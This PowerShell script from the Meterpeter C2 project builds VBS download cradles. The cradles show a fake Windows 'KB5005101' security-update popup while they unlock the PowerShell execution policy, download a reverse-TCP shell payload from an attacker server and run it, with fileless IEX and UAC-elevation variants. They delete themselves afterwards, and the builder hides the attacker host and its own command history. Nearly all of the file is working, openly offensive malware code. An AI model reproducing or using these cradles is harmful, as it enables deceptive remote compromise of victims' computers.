<#
.SYNOPSIS
   Cmdlet to create Download_Crandle.vbs

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: @Meterpeter C2 v2.10.11
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.5

.DESCRIPTION
   Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.11
   users to create VBS download crandles to download\execute rev tcp shells
   in background process ( orphan ) with or without UAC elevation privileges.

.NOTES
   If invoked -action 'default' then cmdlet creates Download_crandle.vbs
   that downloads\executes your payload.ps1 from %tmp% remote location.

   If invoked -action 'fileless' then cmdlet creates Download_crandle.vbs
   with payload FileLess (ram) execution ( payload does not touch disk )

   If invoked -UACElevation 'true' then cmdlet creates Download_crandle.vbs
   with UAC elevation function, If invoked -UACElevation 'false' then cmdlet
   creates Download_crandle.vbs without the UAC elevation function technic.

   Remark: The UAC elevation function spawns an UAC GUI to user at runtime
   asking to run the application with 'administrator' token privileges.

.Parameter Action
   Accepts arguments: default, fileless (default: default)

.Parameter UACElevation
   Accepts arguments: true, false (default: false)

.Parameter VbsName
   The VBS crandle name (default: Download_Crandle.vbs)

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'true'
   creates 'Download_crandle.vbs' with UAC elevation function

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'false'
   creates 'Download_crandle.vbs' without the UAC elevation function

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'false' -vbsname "MineDownloader.vbs"
   creates 'MineDownloader.vbs' without the UAC elevation function technic

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -action 'fileless' -UACElevation 'true'
   creates 'Download_crandle.vbs' (FileLess payload exec) with UAC elevation

.INPUTS
   None. You cannot pipe objects into crandle_builder.ps1

.OUTPUTS
   * Creating 'Download_Crandle.vbs' (default)
   * Done, Crandle Created, Exiting..[OK]

   ' Author: @r00t-3xp10it (ssa)
   ' Application: meterpeter v2.10.11 download crandle
   ' Description:
   '   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
   '   pretending to be a security KB5005101 21H1 update, while downloads\executes
   '   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
   ' ---

   dIm 2GCp1,pGtyZ,wohSwPE
   2GCp1="@!COLOMBO@!"+":007:VIRIATO@!"+"NAVIGATOR@!"
   wohSwPE=rEpLaCe(2GCp1, "@!", ""):pGtyZ=rEpLaCe(wohSwPE, ":007:", "")

   .. SNIPED ..
   }
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$VbsName="Download_Crandle.vbs",
   [string]$UACElevation="false",
   [string]$Action="default",
   [string]$Egg="false"
)


$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($Egg -ieq "false")
{
   #Dispaly OnScreen in case its not @Meterpeter executing this
   write-host "`n*" -ForegroundColor Green -NoNewline;
   write-host " Creating '" -ForegroundColor DarkGray -NoNewline;
   write-host "$VbsName" -ForegroundColor Green -NoNewline;
   write-host "'" -ForegroundColor DarkGray -NoNewline;
   write-host " ($Action)" -ForegroundColor DarkGray; 
}


If($Action -ieq "Default")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Creates download crandles (not fileless)

   .NOTES
      This function creates crandles with or without UAC elevation
      functions and auto-deletes the crandle downloader in the end.
   #>

$UserLand = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
'   and it deletes itself (Download_Crandle.vbs) in the end of execution.
' ---

dIm Char,Cmd,Layback
Char=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
Layback=rEpLaCe(Char, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

set objshell = CreateObject(`"Wscript.Shell`")
Set AutoDelFile = CreateObject(`"Scripting.FileSystemObject`")
CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
objShell.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
objShell.Run(`"powershell.exe cd `$Env:TMP;powershell.exe iwr -Uri http://`"+Cmd+`"/Update-KB5005101.ps1 -OutFile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1`"), 0
AutoDelFile.DeleteFile Wscript.ScriptFullName, True
}")


$AutoElevation = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
'   and it deletes itself (Download_Crandle.vbs) in the end of execution.
' ---

'VBS-Auto-Elevation function
If WScript.Arguments.length = 0 Then
   Set objShell = CreateObject(`"Shell.Application`")
   objShell.ShellExecute `"wscript.exe`", Chr(34) & _
      WScript.ScriptFullName & Chr(34) & `" uac`", `"`", `"runas`", 1
Else
   dIm Char,Cmd,Layback
   Char=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
   Layback=rEpLaCe(Char, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

   set objshell = CreateObject(`"Wscript.Shell`")
   Set AutoDelFile = CreateObject(`"Scripting.FileSystemObject`")
   CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
   objShell.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
   objShell.Run(`"powershell.exe cd `$Env:TMP;powershell.exe iwr -Uri http://`"+Cmd+`"/Update-KB5005101.ps1 -OutFile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1`"), 0
   AutoDelFile.DeleteFile Wscript.ScriptFullName, True
End If
}")

}
ElseIf($Action -ieq "fileless")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create FileLess download crandles (payload dont touch disk)

   .NOTES
      This function creates crandles with or without UAC elevation function
   #>

$UserLand = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle (FileLess)
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
' ---

dIm Char,Cmd,Layback,fdx,rtt
rtt=`"I@X`":fdx=replace(rtt, `"@`", `"E`")
Char=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
Layback=rEpLaCe(Char, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

set objshell = CreateObject(`"Wscript.Shell`")
CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
objShell.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
objShell.Run(`"powershell -C `"+fdx+`" (New-Object Net.WebClient).DownloadString('http://`"+Cmd+`"/Update-KB5005101.ps1')`"), 0
}")


$AutoElevation = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle (FileLess)
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
' ---

'VBS-Auto-Elevation function
If WScript.Arguments.length = 0 Then
   Set objShell = CreateObject(`"Shell.Application`")
   objShell.ShellExecute `"wscript.exe`", Chr(34) & _
      WScript.ScriptFullName & Chr(34) & `" uac`", `"`", `"runas`", 1
Else
   dIm Char,Cmd,Layback
   rtt=`"I@X`":fdx=replace(rtt, `"@`", `"E`")
   Char=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
   Layback=rEpLaCe(Char, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

   set objshell = CreateObject(`"Wscript.Shell`")
   CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
   objShell.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
   objShell.Run(`"powershell -C `"+fdx+`" (New-Object Net.WebClient).DownloadString('http://`"+Cmd+`"/Update-KB5005101.ps1')`"), 0
End If
}")

}
Else
{
   write-host ""
   write-host "[error] Wrong argument input: $Action" -ForegroundColor Red -BackgroundColor Black
   Get-Help .\crandle_builder.ps1 -full;exit #Exit @Crandle_Builder - Trigger Get-Help function!
}


## Create VBS Download Crandle Script
# NOTE: crandle will be created on current directory
If($UACElevation -ieq "True")
{
   echo $AutoElevation|Out-File "$VbsName" -Encoding string -Force
}
ElseIf($UACElevation -ieq "False")
{
   echo $UserLand|Out-File "$VbsName" -Encoding string -Force
}
Else
{
   Write-Host "[error] -UACElevation 'true|false' missing parameter .."
}

If($Egg -ieq "false")
{

   Start-Sleep -Milliseconds 500
   #Make sure crandle.vbs was successfuly created ...
   If(Test-Path -Path "$VbsName" -EA SilentlyContinue)
   {
      #Dispaly OnScreen in case its not @Meterpeter exec
      write-host "*" -ForegroundColor Green -NoNewline;
      write-host " Done, Crandle Created, Exiting.." -ForegroundColor DarkGray -NoNewline;
      write-host "[" -ForegroundColor DarkGray -NoNewline;
      write-host "OK" -ForegroundColor Green -NoNewline;
      write-host "]`n" -ForegroundColor DarkGray;
      Get-Content -Path "$VbsName" -EA SilentlyContinue
   }
   Else
   {
      #Dispaly OnScreen in case its not @Meterpeter exec
      write-host "*" -ForegroundColor Red -NoNewline;
      write-host " Fail to create download Crandle.." -ForegroundColor DarkGray -NoNewline;
      write-host "[" -ForegroundColor DarkGray -NoNewline;
      write-host "FAIL" -ForegroundColor Red -NoNewline;
      write-host "]`n" -ForegroundColor DarkGray;     
   }

}
write-host ""